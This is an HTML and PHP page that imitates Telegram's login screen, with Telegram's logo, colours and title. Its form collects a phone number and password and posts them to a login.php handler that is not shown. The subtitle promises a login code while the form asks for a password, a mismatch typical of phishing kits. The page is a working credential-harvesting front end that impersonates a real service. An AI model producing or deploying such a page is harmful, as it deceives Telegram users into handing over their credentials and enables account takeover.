<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to Telegram</title>
<style>
  :root {
    --tg-blue: #2AABEE;
    --tg-blue-dark: #229ED9;
    --ink: #17212B;
    --muted: #6D7883;
    --bg: #F4F7F9;
    --card: #FFFFFF;
    --border: #E3E8EC;
  }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--bg);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: var(--ink);
    padding: 24px;
  }

  .card {
    width: 100%;
    max-width: 380px;
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 36px 32px;
  }

  .logo {
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--tg-blue), var(--tg-blue-dark));
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
  }

  .logo svg { width: 28px; height: 28px; fill: white; }

  h1 {
    font-size: 20px;
    font-weight: 600;
    text-align: center;
    margin: 0 0 6px;
  }

  .subtitle {
    text-align: center;
    color: var(--muted);
    font-size: 14px;
    margin: 0 0 28px;
    line-height: 1.4;
  }

  form { display: flex; flex-direction: column; gap: 16px; }

  .field { display: flex; flex-direction: column; gap: 6px; }

  label {
    font-size: 13px;
    font-weight: 500;
    color: var(--muted);
  }

  input {
    height: 44px;
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 0 14px;
    font-size: 15px;
    color: var(--ink);
    outline: none;
    transition: border-color 0.15s ease;
  }

  input::placeholder { color: #A6B1BB; }

  input:focus { border-color: var(--tg-blue); }

  .btn {
    height: 46px;
    border: none;
    border-radius: 10px;
    background: var(--tg-blue);
    color: white;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
    transition: background 0.15s ease;
  }

  .btn:hover { background: var(--tg-blue-dark); }

  .btn:focus-visible { outline: 2px solid var(--tg-blue-dark); outline-offset: 2px; }

  .error {
    display: none;
    font-size: 13px;
    color: #E53E3E;
    margin-top: -6px;
  }

  .error.show { display: block; }

  .footer-note {
    text-align: center;
    font-size: 13px;
    color: var(--muted);
    margin-top: 20px;
  }

  .footer-note a {
    color: var(--tg-blue);
    text-decoration: none;
    font-weight: 500;
  }

  .footer-note a:hover { text-decoration: underline; }
</style>
</head>
<body>

  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71l-4.14-3.05-2 1.93c-.23.23-.42.42-.82.42z"/></svg>
    </div>

    <h1>Log in to Telegram</h1>
    <p class="subtitle">Enter your phone number to receive a login code.</p>

    <?php if (isset($_GET['error'])): ?>
      <p class="error show" style="text-align:center; margin-bottom:16px;">
        <?php
          $errors = [
            'invalid' => 'Invalid phone number or password.',
            'empty'   => 'Please fill in both fields.',
          ];
          echo $errors[$_GET['error']] ?? 'Something went wrong. Try again.';
        ?>
      </p>
    <?php endif; ?>

    <form id="loginForm" action="login.php" method="POST" novalidate>
      <div class="field">
        <label for="phone">Phone number</label>
        <input type="tel" id="phone" name="phone" placeholder="+91 98765 43210" autocomplete="tel" required>
        <span class="error" id="phoneError">Enter a valid phone number.</span>
      </div>

      <div class="field">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
        <span class="error" id="passwordError">Password must be at least 6 characters.</span>
      </div>

      <button type="submit" class="btn">Log in</button>
    </form>

    <p class="footer-note">Don't have an account? <a href="#">Sign up</a></p>
  </div>

<script>
  const form = document.getElementById('loginForm');
  const phone = document.getElementById('phone');
  const password = document.getElementById('password');
  const phoneError = document.getElementById('phoneError');
  const passwordError = document.getElementById('passwordError');

  form.addEventListener('submit', function (e) {
    let valid = true;

    const phoneDigits = phone.value.replace(/\D/g, '');
    if (phoneDigits.length < 10) {
      phoneError.classList.add('show');
      valid = false;
    } else {
      phoneError.classList.remove('show');
    }

    if (password.value.length < 6) {
      passwordError.classList.add('show');
      valid = false;
    } else {
      passwordError.classList.remove('show');
    }

    if (!valid) {
      e.preventDefault(); // stop submit, real POST to login.php only happens when valid
    }
  });
</script>

</body>
</html>